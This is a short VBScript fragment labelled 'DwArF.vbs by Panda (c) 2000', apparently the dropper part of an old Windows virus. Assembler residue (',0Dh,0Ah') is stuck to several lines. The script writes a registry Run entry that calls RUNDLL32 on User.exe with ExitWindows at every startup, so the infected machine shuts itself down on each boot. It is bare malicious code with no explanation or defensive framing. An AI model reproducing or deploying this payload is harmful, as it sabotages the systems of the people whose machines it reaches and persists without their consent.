rem DwArF.vbs by Panda (c) 2000
Dim WSHShell',0Dh,0Ah
Set WSHShell = Wscript.CreateObject("WScript.Shell")',0Dh,0Ah
WSHShell.Regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\DwArF", "C:\WINDOWS\RUNDLL32.EXE C:\Windows\system\User.exe,ExitWindows"